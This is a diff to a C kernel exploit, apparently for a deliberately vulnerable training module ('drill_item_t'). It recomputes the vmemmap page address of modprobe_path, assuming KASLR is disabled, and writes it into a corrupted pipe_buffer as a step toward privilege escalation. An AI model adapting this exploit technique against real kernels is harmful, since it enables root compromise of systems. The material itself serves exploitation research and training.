@@ -54,10 +54,16 @@
 #define PB_PER_SLAB_SLOT	2
 #define PIPE_CAPACITY		PAGE_SIZE * PB_PER_SLAB_SLOT
 
-#define MODPROBE_PTR		0xffffffff82d486e0UL
-
-#define VIRTUAL_TO_PAGE(addr) \
-	((((addr) - 0xffffffff80000000UL) / 0x1000) * 0x40 + 0xffffea0000000000UL)
+/* The following formula is valid only when KASLR is disabled */
+#define MODPROBE_PATH_VADDR	0xffffffff82d486a0UL
+#define KERNEL_TEXT_VADDR	0xffffffff81000000UL
+#define MODPROBE_PATH_OFFSET	(MODPROBE_PATH_VADDR - KERNEL_TEXT_VADDR)
+#define KERNEL_TEXT_PHYS_ADDR 	0x1000000UL
+#define STRUCT_PAGE_SZ		64UL
+#define VMEMMAP_BASE		0xffffea0000000000UL
+#define MODPROBE_PATH_PAGE_OFFSET \
+	((KERNEL_TEXT_PHYS_ADDR + MODPROBE_PATH_OFFSET) >> 12) * STRUCT_PAGE_SZ
+#define MODPROBE_PATH_PAGE_ADDR	(VMEMMAP_BASE + MODPROBE_PATH_PAGE_OFFSET)
 /* clang-format on */
 
 int increase_fd_limit(void)
@@ -348,7 +354,7 @@ int main(void)
 	printf("[+] allocated pipe_buffer objects and a drill_item_t object among them\n");
 
 	printf("[*] trying to corrupt a pipe_buffer near the drill_item_t object...\n");
-	snprintf(err_act, sizeof(err_act), "3 %d 0x%lx 0x50", 0, VIRTUAL_TO_PAGE(MODPROBE_PTR));
+	snprintf(err_act, sizeof(err_act), "3 %d 0x%lx 0x50", 0, MODPROBE_PATH_PAGE_ADDR);
 	ret = write(act_fd, err_act, strlen(err_act) + 1);
 	if (ret <= 0) {
 		ret = EXIT_FAILURE;
